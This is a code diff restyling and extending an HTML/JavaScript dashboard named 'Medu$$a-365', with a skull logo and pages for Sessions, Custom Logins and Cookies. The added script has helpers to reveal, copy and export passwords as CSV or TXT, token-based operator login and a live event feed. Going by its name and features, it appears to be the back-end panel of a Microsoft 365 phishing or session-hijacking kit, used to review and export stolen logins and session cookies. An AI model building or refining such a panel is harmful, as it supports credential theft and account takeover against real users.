@@ -4,580 +4,144 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Medu$$a-365</title>
-    <!-- Keep Lucide Font -->
+    <!-- Lucide Icons CDN -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lucide-static@0.344.0/font/lucide.min.css" />
     <style>
-        /* ── reset & root ── */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        /* ── Professional Dark/Green Theme ── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
-            /* Professional Dark Theme Matching Image */
-            --black: #0f172a;       /* slate-900 */
-            --surface: #1e293b;     /* slate-800 */
-            --surface2: #334155;    /* slate-700 */
-            --red: #10b981;         /* emerald-500 */
-            --darkred: #047857;     /* emerald-700 */
-            --glow: #34d399;        /* emerald-400 */
-            --purple: #a855f7;      /* purple accent for icons */
-            --text: #f8fafc;        /* slate-50 */
-            --muted: #94a3b8;       /* slate-400 */
-            --border: #334155;
-            --radius: 8px;
-            --shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-            --transition: 0.2s ease;
+            --black: #0f172a; --surface: #1e293b; --surface2: #334155;
+            --red: #10b981; --darkred: #047857; --glow: #34d399;
+            --purple: #a855f7; --text: #f8fafc; --muted: #94a3b8;
+            --border: #334155; --radius: 8px; --transition: 0.2s ease;
         }
-        html, body {
-            height: 100%;
-            background: var(--black);
-            color: var(--text);
-            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
-            font-size: 14px;
-            line-height: 1.5;
-            overflow: hidden;
-        }
-        ::-webkit-scrollbar { width: 5px; height: 5px; }
-        ::-webkit-scrollbar-track { background: var(--surface); }
-        ::-webkit-scrollbar-thumb { background: var(--darkred); border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--red); }
+        html, body { height: 100%; background: var(--black); color: var(--text); font-family: 'Inter', 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 1.5; overflow: hidden; }
+        ::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-track { background: var(--surface); } ::-webkit-scrollbar-thumb { background: var(--darkred); border-radius: 10px; }
         .hidden { display: none !important; }
 
-        /* ── auth ── */
-        .auth-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: radial-gradient(ellipse at center, #1e293b, #0f172a);
-        }
-        .auth-card {
-            background: var(--surface);
-            padding: 36px 32px 40px;
-            border-radius: var(--radius);
-            border: 1px solid var(--darkred);
-            width: 380px;
-            text-align: center;
-            box-shadow: var(--shadow);
-        }
-        .auth-title {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--red);
-            letter-spacing: 2px;
-            margin-bottom: 24px;
-        }
-        .auth-card input {
-            width: 100%;
-            padding: 12px 14px;
-            margin-bottom: 14px;
-            background: var(--surface2);
-            border: 1px solid var(--border);
-            color: var(--text);
-            outline: none;
-            border-radius: 6px;
-            font-size: 0.95rem;
-            transition: border var(--transition), box-shadow var(--transition);
-        }
-        .auth-card input:focus {
-            border-color: var(--red);
-            box-shadow: 0 0 12px rgba(16, 185, 129, 0.2);
-        }
-        .auth-card button {
-            width: 100%;
-            background: var(--red);
-            color: #fff;
-            border: none;
-            padding: 13px;
-            cursor: pointer;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-radius: 6px;
-            transition: background var(--transition), box-shadow var(--transition);
-            font-size: 0.95rem;
-        }
-        .auth-card button:hover {
-            background: var(--glow);
-            box-shadow: 0 0 20px rgba(16, 185, 129, 0.4);
-        }
+        /* Auth */
+        .auth-container { display: flex; justify-content: center; align-items: center; height: 100vh; background: radial-gradient(ellipse at center, #1e293b, #0f172a); }
+        .auth-card { background: var(--surface); padding: 36px 32px 40px; border-radius: var(--radius); border: 1px solid var(--darkred); width: 380px; text-align: center; }
+        .auth-title { font-size: 2rem; font-weight: 700; color: var(--red); letter-spacing: 2px; margin-bottom: 24px; }
+        .auth-card input { width: 100%; padding: 12px 14px; margin-bottom: 14px; background: var(--surface2); border: 1px solid var(--border); color: var(--text); outline: none; border-radius: 6px; font-size: 0.95rem; }
+        .auth-card input:focus { border-color: var(--red); box-shadow: 0 0 12px rgba(16, 185, 129, 0.2); }
+        .auth-card button { width: 100%; background: var(--red); color: #fff; border: none; padding: 13px; cursor: pointer; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; border-radius: 6px; }
+        .auth-card button:hover { background: var(--glow); }
+        .error { color: #ef4444; margin-top: 10px; font-size: 0.85rem; }
+        .auth-link { margin-top: 16px; font-size: 0.9rem; color: var(--muted); }
+        .auth-link a { color: var(--red); text-decoration: none; }
 
-        /* ── dashboard layout ── */
-        .dashboard {
-            display: flex;
-            height: 100vh;
-            background: var(--black);
-        }
-
-        /* ── sidebar ── */
-        .sidebar {
-            width: 240px;
-            background: var(--surface);
-            border-right: 1px solid var(--border);
-            display: flex;
-            flex-direction: column;
-            padding: 20px 16px;
-            flex-shrink: 0;
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 1.5rem;
-            font-weight: 800;
-            color: var(--red);
-            letter-spacing: 1px;
-            padding-bottom: 24px;
-            border-bottom: 1px solid var(--border);
-            margin-bottom: 20px;
-        }
+        /* Dashboard Layout */
+        .dashboard { display: flex; height: 100vh; background: var(--black); }
+        .sidebar { width: 240px; background: var(--surface); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 16px; flex-shrink: 0; }
+        .logo { display: flex; align-items: center; gap: 10px; font-size: 1.5rem; font-weight: 800; color: var(--red); letter-spacing: 1px; padding-bottom: 24px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
         .logo .lucide { width: 28px; height: 28px; stroke-width: 2.5; }
-        .nav {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            gap: 2px;
-        }
-        .nav-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            color: var(--muted);
-            text-decoration: none;
-            padding: 10px 12px;
-            border-radius: 6px;
-            transition: all var(--transition);
-            font-weight: 500;
-            font-size: 0.9rem;
-            cursor: pointer;
-            border-left: 3px solid transparent;
-        }
-        .nav-item .lucide { width: 18px; height: 18px; stroke-width: 2; flex-shrink: 0; }
-        .nav-item:hover {
-            color: var(--text);
-            background: var(--surface2);
-        }
-        .nav-item.active {
-            color: var(--text);
-            background: var(--surface2);
-            border-left-color: var(--red);
-        }
-        .nav-item .badge {
-            margin-left: auto;
-            background: var(--darkred);
-            color: #fff;
-            font-size: 0.7rem;
-            padding: 1px 8px;
-            border-radius: 20px;
-            font-weight: 600;
-        }
-        .sidebar-footer {
-            margin-top: auto;
-            padding-top: 16px;
-            border-top: 1px solid var(--border);
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        .sidebar-footer button {
-            width: 100%;
-            background: var(--red);
-            color: #fff;
-            border: none;
-            padding: 10px;
-            cursor: pointer;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-radius: 6px;
-            transition: background var(--transition);
-            font-size: 0.8rem;
-        }
-        .sidebar-footer button:hover {
-            background: var(--glow);
-        }
-        .sidebar-footer .version {
-            text-align: center;
-            color: var(--muted);
-            font-size: 0.7rem;
-            opacity: 0.5;
-        }
+        .nav { flex: 1; display: flex; flex-direction: column; gap: 2px; }
+        .nav-item { display: flex; align-items: center; gap: 12px; color: var(--muted); text-decoration: none; padding: 10px 12px; border-radius: 6px; transition: all var(--transition); font-weight: 500; cursor: pointer; border-left: 3px solid transparent; }
+        .nav-item .lucide { width: 18px; height: 18px; stroke-width: 2; }
+        .nav-item:hover { color: var(--text); background: var(--surface2); }
+        .nav-item.active { color: var(--text); background: var(--surface2); border-left-color: var(--red); }
+        .nav-item .badge { margin-left: auto; background: var(--darkred); color: #fff; font-size: 0.7rem; padding: 1px 8px; border-radius: 20px; font-weight: 600; }
+        .sidebar-footer { margin-top: auto; padding-top: 16px; border-top: 1px solid var(--border); display: flex; flex-direction: column; gap: 8px; }
+        .sidebar-footer button { width: 100%; background: var(--red); color: #fff; border: none; padding: 10px; cursor: pointer; font-weight: 700; border-radius: 6px; font-size: 0.8rem; }
+        .sidebar-footer button:hover { background: var(--glow); }
+        .sidebar-footer .version { text-align: center; color: var(--muted); font-size: 0.7rem; opacity: 0.5; }
 
-        /* ── content ── */
-        .content {
-            flex: 1;
-            overflow-y: auto;
-            padding: 24px 32px 32px;
-            background: var(--black);
-        }
-        .topbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
-            background: var(--surface);
-            border: 1px solid var(--border);
-            padding: 12px 16px;
-            border-radius: var(--radius);
-        }
-        .topbar h2 {
-            font-size: 1.3rem;
-            font-weight: 600;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-        }
-        .topbar h2 span {
-            font-size: 0.8rem;
-            color: var(--muted);
-            font-weight: 400;
-        }
-        .topbar-actions {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-        .search-box {
-            position: relative;
-            background: var(--surface2);
-            border-radius: 6px;
-            border: 1px solid var(--border);
-        }
-        .search-box input {
-            background: transparent;
-            border: none;
-            color: var(--text);
-            padding: 8px 12px 8px 36px;
-            outline: none;
-        }
-        .search-box .lucide {
-            position: absolute;
-            left: 10px;
-            top: 8px;
-            color: var(--muted);
-            width: 16px;
-            height: 16px;
-        }
-        .btn-primary {
-            background: var(--red);
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: 600;
-        }
+        /* Content */
+        .content { flex: 1; overflow-y: auto; padding: 24px 32px 32px; background: var(--black); }
+        .topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; background: var(--surface); border: 1px solid var(--border); padding: 12px 16px; border-radius: var(--radius); }
+        .topbar h2 { font-size: 1.3rem; font-weight: 600; margin: 0; display: flex; flex-direction: column; }
+        .topbar h2 span { font-size: 0.8rem; color: var(--muted); font-weight: 400; }
+        .topbar-actions { display: flex; align-items: center; gap: 16px; }
+        .search-box { position: relative; background: var(--surface2); border-radius: 6px; border: 1px solid var(--border); }
+        .search-box input { background: transparent; border: none; color: var(--text); padding: 8px 12px 8px 36px; outline: none; }
+        .search-box .lucide { position: absolute; left: 10px; top: 8px; color: var(--muted); width: 16px; height: 16px; }
+        .btn-primary { background: var(--red); color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 600; }
         .btn-primary:hover { background: var(--glow); }
-        .icon-btn {
-            background: transparent;
-            border: none;
-            color: var(--muted);
-            cursor: pointer;
-            position: relative;
-        }
+        .icon-btn { background: transparent; border: none; color: var(--muted); cursor: pointer; position: relative; }
         .icon-btn:hover { color: var(--text); }
         .icon-btn .lucide { width: 18px; height: 18px; }
-        .icon-btn .badge {
-            position: absolute;
-            top: -5px;
-            right: -5px;
-            background: #ef4444;
-            color: white;
-            font-size: 10px;
-            padding: 1px 4px;
-            border-radius: 10px;
-        }
+        .icon-btn .badge { position: absolute; top: -5px; right: -5px; background: #ef4444; color: white; font-size: 10px; padding: 1px 4px; border-radius: 10px; }
 
-        /* ── cards ── */
-        .card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px 24px;
-            transition: border var(--transition);
-        }
-        .card:hover { border-color: var(--darkred); }
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-        .card-title {
-            color: var(--text);
-            font-size: 1rem;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        /* Cards & Stats */
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 20px 24px; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .card-title { color: var(--text); font-size: 1rem; font-weight: 500; display: flex; align-items: center; gap: 8px; }
         .card-title .lucide { color: var(--purple); }
-        .card-actions {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-        }
-        .card-actions button {
-            background: var(--surface2);
-            border: 1px solid var(--border);
-            color: var(--muted);
-            padding: 6px 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.75rem;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            transition: all var(--transition);
-        }
-        .card-actions button:hover {
-            background: var(--darkred);
-            color: #fff;
-            border-color: var(--red);
-        }
-
-        /* ── stats grid ── */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 16px;
-            margin-bottom: 20px;
-        }
-        .stat-card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 18px 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        .stat-card:hover { border-color: var(--darkred); }
-        .stat-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-        }
-        .stat-icon {
-            width: 44px;
-            height: 44px;
-            border-radius: 10px;
-            background: var(--surface2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--red);
-        }
+        .card-actions { display: flex; gap: 8px; align-items: center; }
+        .card-actions button { background: var(--surface2); border: 1px solid var(--border); color: var(--muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.75rem; display: flex; align-items: center; gap: 6px; }
+        .card-actions button:hover { background: var(--darkred); color: #fff; border-color: var(--red); }
+        
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 20px; }
+        .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 18px 20px; display: flex; flex-direction: column; gap: 8px; }
+        .stat-header { display: flex; justify-content: space-between; align-items: flex-start; }
+        .stat-icon { width: 44px; height: 44px; border-radius: 10px; background: var(--surface2); display: flex; align-items: center; justify-content: center; color: var(--red); }
         .stat-icon .lucide { width: 22px; height: 22px; }
-        .stat-percent {
-            font-size: 0.8rem;
-            padding: 4px 8px;
-            border-radius: 20px;
-            font-weight: 600;
-        }
+        .stat-percent { font-size: 0.8rem; padding: 4px 8px; border-radius: 20px; font-weight: 600; }
         .stat-percent.positive { background: rgba(16, 185, 129, 0.1); color: var(--red); }
         .stat-info .label { color: var(--muted); font-size: 0.8rem; }
         .stat-info .value { font-size: 2rem; font-weight: 700; line-height: 1.2; }
-        .stat-footer {
-            font-size: 0.8rem;
-            color: var(--muted);
-        }
-
-        /* ── toggle switch ── */
-        .toggle {
-            width: 44px;
-            height: 24px;
-            background: var(--surface2);
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            cursor: pointer;
-            position: relative;
-            transition: all var(--transition);
-            flex-shrink: 0;
-        }
-        .toggle.active {
-            background: var(--red);
-            border-color: var(--red);
-        }
-        .toggle::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            width: 18px;
-            height: 18px;
-            background: #fff;
-            border-radius: 50%;
-            transition: all var(--transition);
-        }
+        .stat-footer { font-size: 0.8rem; color: var(--muted); }
+        .toggle { width: 44px; height: 24px; background: var(--surface2); border-radius: 20px; border: 1px solid var(--border); cursor: pointer; position: relative; transition: all var(--transition); flex-shrink: 0; }
+        .toggle.active { background: var(--red); border-color: var(--red); }
+        .toggle::after { content: ''; position: absolute; top: 2px; left: 2px; width: 18px; height: 18px; background: #fff; border-radius: 50%; transition: all var(--transition); }
         .toggle.active::after { left: 22px; }
 
-        /* ── tables ── */
-        .table-wrap {
-            overflow-x: auto;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 0.85rem;
-        }
-        th, td {
-            padding: 10px 12px;
-            text-align: left;
-            border-bottom: 1px solid var(--border);
-            vertical-align: middle;
-        }
-        th {
-            color: var(--muted);
-            font-weight: 600;
-            text-transform: uppercase;
-            font-size: 0.7rem;
-            letter-spacing: 0.5px;
-            border-bottom: 2px solid var(--border);
-        }
+        /* Tables & Charts */
+        .table-wrap { overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+        th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); vertical-align: middle; }
+        th { color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 0.7rem; letter-spacing: 0.5px; }
         tr:hover td { background: rgba(51, 65, 85, 0.2); }
-        td .actions {
-            display: flex;
-            gap: 4px;
-            align-items: center;
-        }
-        .btn-icon {
-            background: transparent;
-            border: none;
-            color: var(--muted);
-            cursor: pointer;
-            padding: 4px 6px;
-            border-radius: 4px;
-            transition: all var(--transition);
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            font-size: 0.75rem;
-        }
+        .btn-icon { background: transparent; border: none; color: var(--muted); cursor: pointer; padding: 4px 6px; border-radius: 4px; transition: all var(--transition); display: inline-flex; align-items: center; }
         .btn-icon:hover { color: var(--text); background: var(--surface2); }
-        .btn-icon.copy:hover { color: var(--red); }
-        .btn-icon.delete:hover { color: #ef4444; }
-        .btn-icon .lucide { width: 14px; height: 14px; }
+        .btn-icon.copy:hover { color: var(--red); } .btn-icon.delete:hover { color: #ef4444; }
+        .empty-state { text-align: center; padding: 40px 20px; color: var(--muted); border: 1px dashed var(--border); border-radius: 8px; }
+        .empty-state .lucide { width: 48px; height: 48px; stroke-width: 1.5; color: var(--darkred); margin-bottom: 12px; opacity: 0.5; }
+        .chart-placeholder { height: 250px; background: linear-gradient(to bottom, rgba(16, 185, 129, 0.1), transparent); border: 1px solid var(--border); border-radius: 8px; position: relative; display: flex; align-items: flex-end; justify-content: space-around; padding: 20px; }
+        .chart-bar { width: 10%; background: var(--darkred); border-radius: 4px 4px 0 0; opacity: 0.8; }
 
-        /* ── empty state ── */
-        .empty-state {
-            text-align: center;
-            padding: 40px 20px;
-            color: var(--muted);
-            border: 1px dashed var(--border);
-            border-radius: 8px;
-        }
-        .empty-state .lucide {
-            width: 48px;
-            height: 48px;
-            stroke-width: 1.5;
-            color: var(--darkred);
-            margin-bottom: 12px;
-            opacity: 0.5;
-        }
-
-        /* ── chart placeholder ── */
-        .chart-placeholder {
-            height: 250px;
-            background: linear-gradient(to bottom, rgba(16, 185, 129, 0.1), transparent);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            position: relative;
-            display: flex;
-            align-items: flex-end;
-            justify-content: space-around;
-            padding: 20px;
-        }
-        .chart-bar {
-            width: 10%;
-            background: var(--darkred);
-            border-radius: 4px 4px 0 0;
-            opacity: 0.8;
-        }
-
-        /* ── toast ── */
-        .toast-container {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            z-index: 9999;
-        }
-        .toast {
-            background: var(--surface);
-            border: 1px solid var(--darkred);
-            border-radius: var(--radius);
-            padding: 12px 20px;
-            color: var(--text);
-            font-size: 0.85rem;
-            box-shadow: var(--shadow);
-            animation: slideUp 0.3s ease;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            min-width: 200px;
-        }
+        /* Toast */
+        .toast-container { position: fixed; bottom: 24px; right: 24px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
+        .toast { background: var(--surface); border: 1px solid var(--darkred); border-radius: var(--radius); padding: 12px 20px; color: var(--text); font-size: 0.85rem; box-shadow: 0 4px 20px rgba(0,0,0,0.3); animation: slideUp 0.3s ease; display: flex; align-items: center; gap: 10px; }
         .toast .lucide { width: 18px; height: 18px; color: var(--red); }
-        @keyframes slideUp {
-            0% { opacity: 0; transform: translateY(20px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
+        @keyframes slideUp { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-    <!-- ─── AUTH ─── -->
+    <!-- AUTH -->
     <div id="auth-container" class="auth-container">
-        <!-- Register -->
         <div id="register-card" class="auth-card hidden">
             <h1 class="auth-title">Medu$$a-365</h1>
             <input type="text" id="reg-username" placeholder="Username" />
             <input type="email" id="reg-email" placeholder="Email" />
             <input type="password" id="reg-password" placeholder="Password" />
             <button id="register-btn">Register</button>
-            <p id="register-error" class="error" style="color:#ef4444; margin-top:10px;"></p>
-            <p class="auth-link" style="margin-top:16px; color:#94a3b8;"><a href="#" id="go-to-login" style="color:#10b981;">Already have an account? Login</a></p>
+            <p id="register-error" class="error"></p>
+            <p class="auth-link"><a href="#" id="go-to-login">Already have an account? Login</a></p>
         </div>
-        <!-- Login -->
         <div id="login-card" class="auth-card hidden">
             <h1 class="auth-title">Medu$$a-365</h1>
             <input type="text" id="login-username" placeholder="Username" />
             <input type="password" id="login-password" placeholder="Password" />
             <button id="login-btn">Login</button>
-            <p id="login-error" class="error" style="color:#ef4444; margin-top:10px;"></p>
+            <p id="login-error" class="error"></p>
         </div>
     </div>
 
-    <!-- ─── DASHBOARD ─── -->
+    <!-- DASHBOARD -->
     <div id="dashboard" class="dashboard hidden">
-        <!-- Sidebar -->
         <aside class="sidebar">
-            <div class="logo">
-                <i class="lucide lucide-skull"></i>
-                <span>Medu$$a-365</span>
-            </div>
+            <div class="logo"><i class="lucide lucide-skull"></i><span>Medu$$a-365</span></div>
             <nav class="nav">
-                <a href="#" class="nav-item active" data-page="overview">
-                    <i class="lucide lucide-layout-dashboard"></i>
-                    <span>Dashboard</span>
-                </a>
-                <a href="#" class="nav-item" data-page="credentials">
-                    <i class="lucide lucide-user"></i>
-                    <span>Custom Logins</span>
-                    <span class="badge" id="badge-creds">0</span>
-                </a>
-                <a href="#" class="nav-item" data-page="settings">
-                    <i class="lucide lucide-settings"></i>
-                    <span>Settings</span>
-                </a>
-                <a href="#" class="nav-item" data-page="history">
-                    <i class="lucide lucide-wrench"></i>
-                    <span>Developers</span>
-                </a>
+                <a href="#" class="nav-item active" data-page="overview"><i class="lucide lucide-layout-dashboard"></i><span>Dashboard</span></a>
+                <!-- Added back Sessions and Cookies to retain all original functionality -->
+                <a href="#" class="nav-item" data-page="sessions"><i class="lucide lucide-monitor"></i><span>Sessions</span><span class="badge" id="badge-sessions">0</span></a>
+                <a href="#" class="nav-item" data-page="credentials"><i class="lucide lucide-user"></i><span>Custom Logins</span><span class="badge" id="badge-creds">0</span></a>
+                <a href="#" class="nav-item" data-page="cookies"><i class="lucide lucide-cookie"></i><span>Cookies</span><span class="badge" id="badge-cookies">0</span></a>
+                <a href="#" class="nav-item" data-page="history"><i class="lucide lucide-wrench"></i><span>Developers</span></a>
+                <a href="#" class="nav-item" data-page="settings"><i class="lucide lucide-settings"></i><span>Settings</span></a>
             </nav>
             <div class="sidebar-footer">
                 <button id="logout-btn">Logout</button>
@@ -585,37 +149,156 @@
             </div>
         </aside>
 
-        <!-- Content -->
         <main class="content">
             <header class="topbar">
-                <h2>Dashboard <span>Dashboard, State, Login</span></h2>
+                <h2 id="page-title">Dashboard <span>Dashboard, State, Login</span></h2>
                 <div class="topbar-actions">
-                    <div class="search-box">
-                        <i class="lucide lucide-search"></i>
-                        <input type="text" placeholder="Search..." />
-                    </div>
+                    <div class="search-box"><i class="lucide lucide-search"></i><input type="text" placeholder="Search..." /></div>
                     <button class="btn-primary">Start 30 Day Trial</button>
                     <button class="icon-btn"><i class="lucide lucide-refresh-cw"></i></button>
-                    <div class="topbar-text" style="color:#94a3b8; font-size:0.9rem;">10 Users</div>
-                    <button class="icon-btn">
-                        <i class="lucide lucide-bell"></i>
-                        <span class="badge">1</span>
-                    </button>
+                    <div style="color:#94a3b8; font-size:0.9rem;">10 Users</div>
+                    <button class="icon-btn"><i class="lucide lucide-bell"></i><span class="badge">1</span></button>
                 </div>
             </header>
-
             <div id="page-content" class="page-content" style="display:flex; flex-direction:column; gap:20px;"></div>
         </main>
     </div>
 
-    <!-- ─── TOAST CONTAINER ─── -->
     <div class="toast-container" id="toast-container"></div>
 
     <script>
-        // ... (Keep all your original JavaScript functions exactly as they are)
-        // BUT, rewrite the `loadOverview` function to match the new HTML structure below.
-        // I have provided the new `loadOverview` function here for you to replace:
+        // ─── HELPERS ───
+        function toast(msg, icon = 'lucide-check-circle') {
+            const c = document.getElementById('toast-container');
+            const t = document.createElement('div');
+            t.className = 'toast';
+            t.innerHTML = `<i class="lucide ${icon}"></i> ${msg}`;
+            c.appendChild(t);
+            setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 2500);
+        }
+        function formatDate(d) { if (!d) return '-'; try { return new Date(d).toLocaleString(); } catch (e) { return d; } }
+        function escapeHtml(str) { if (!str) return ''; return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
+        function concealPw(pw) { if (!pw) return ''; return '•'.repeat(Math.min(pw.length, 16)); }
+        function copyText(text, label = 'Copied') {
+            if (!text) { toast('Nothing to copy', 'lucide-alert-circle'); return; }
+            if (navigator.clipboard) { navigator.clipboard.writeText(text).then(() => toast(`${label} ✓`, 'lucide-copy')); }
+        }
+        function downloadCSV(rows, cols, filename) {
+            if (!rows.length) { toast('No data to export', 'lucide-alert-circle'); return; }
+            const header = cols.join(',');
+            const body = rows.map(r => cols.map(c => {
+                let v = r[c] ?? '';
+                if (typeof v === 'string' && (v.includes(',') || v.includes('"') || v.includes('\n'))) v = '"' + v.replace(/"/g, '""') + '"';
+                return v;
+            }).join(',')).join('\n');
+            const blob = new Blob([header + '\n' + body], { type: 'text/csv' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = filename + '.csv'; a.click(); URL.revokeObjectURL(a.href);
+            toast('Exported CSV ✓', 'lucide-file-text');
+        }
+        function downloadTXT(rows, cols, filename) {
+            if (!rows.length) { toast('No data to export', 'lucide-alert-circle'); return; }
+            let txt = '';
+            rows.forEach(r => { const line = cols.map(c => r[c] ?? '').join(' | '); txt += line + '\n'; });
+            const blob = new Blob([txt], { type: 'text/plain' });
+            const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = filename + '.txt'; a.click();
+            URL.revokeObjectURL(a.href); toast('Exported TXT ✓', 'lucide-file-text');
+        }
 
+        // ─── STATE & DOM REFS ───
+        let token = localStorage.getItem('medusa_token');
+        let currentPage = 'overview';
+        let allSessions = []; let allCreds = []; let allCookies = []; let allHistory = [];
+        let revealedPasswords = new Set(); let sseConnection = null;
+
+        const authContainer = document.getElementById('auth-container');
+        const registerCard = document.getElementById('register-card');
+        const loginCard = document.getElementById('login-card');
+        const dashboard = document.getElementById('dashboard');
+        const pageContent = document.getElementById('page-content');
+        const badgeSessions = document.getElementById('badge-sessions');
+        const badgeCreds = document.getElementById('badge-creds');
+        const badgeCookies = document.getElementById('badge-cookies');
+
+        // ─── AUTH ───
+        async function checkSetup() {
+            try { const res = await fetch('/api/setup-status'); const data = await res.json();
+                if (data.needsSetup) { registerCard.classList.remove('hidden'); loginCard.classList.add('hidden'); }
+                else { loginCard.classList.remove('hidden'); registerCard.classList.add('hidden'); }
+            } catch (e) { loginCard.classList.remove('hidden'); }
+        }
+        function showAuth() {
+            authContainer.classList.remove('hidden'); dashboard.classList.add('hidden');
+            if (sseConnection) { sseConnection.close(); sseConnection = null; }
+        }
+        function showDashboard() {
+            authContainer.classList.add('hidden'); dashboard.classList.remove('hidden');
+            connectSSE(); loadPage(currentPage);
+        }
+        if (token) { showDashboard(); } else { checkSetup(); }
+
+        document.getElementById('register-btn').addEventListener('click', async () => {
+            const username = document.getElementById('reg-username').value.trim();
+            const email = document.getElementById('reg-email').value.trim();
+            const password = document.getElementById('reg-password').value;
+            if (!username || !email || !password) { document.getElementById('register-error').textContent = 'All fields required'; return; }
+            const res = await fetch('/api/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, email, password }) });
+            const data = await res.json();
+            if (res.ok) { registerCard.classList.add('hidden'); loginCard.classList.remove('hidden'); toast('Registration successful!'); }
+            else { document.getElementById('register-error').textContent = data.error; }
+        });
+
+        document.getElementById('go-to-login').addEventListener('click', (e) => { e.preventDefault(); registerCard.classList.add('hidden'); loginCard.classList.remove('hidden'); });
+
+        document.getElementById('login-btn').addEventListener('click', async () => {
+            const username = document.getElementById('login-username').value.trim();
+            const password = document.getElementById('login-password').value;
+            if (!username || !password) { document.getElementById('login-error').textContent = 'Username and password required'; return; }
+            const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) });
+            const data = await res.json();
+            if (res.ok) { token = data.token; localStorage.setItem('medusa_token', token); showDashboard(); }
+            else { document.getElementById('login-error').textContent = data.error; }
+        });
+
+        document.getElementById('logout-btn').addEventListener('click', () => {
+            localStorage.removeItem('medusa_token'); token = null; showAuth();
+            loginCard.classList.remove('hidden'); registerCard.classList.add('hidden'); toast('Logged out', 'lucide-log-out');
+        });
+
+        async function fetchWithAuth(url) {
+            const res = await fetch(url, { headers: { 'Authorization': `Bearer ${token}` } });
+            if (res.status === 401) { localStorage.removeItem('medusa_token'); token = null; showAuth(); throw new Error('Unauthorized'); }
+            return res.json();
+        }
+
+        // ─── NAVIGATION ───
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.preventDefault();
+                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+                const page = item.dataset.page;
+                if (page) { currentPage = page; loadPage(page); }
+            });
+        });
+
+        async function loadPage(page) {
+            const titles = { overview: 'Dashboard', sessions: 'Sessions', credentials: 'Custom Logins', cookies: 'Cookies', history: 'Developers', settings: 'Settings' };
+            document.getElementById('page-title').innerHTML = `${titles[page] || page} <span>Dashboard, State, Login</span>`;
+            
+            switch (page) {
+                case 'overview': await loadOverview(); break;
+                case 'sessions': await loadSessions(); break;
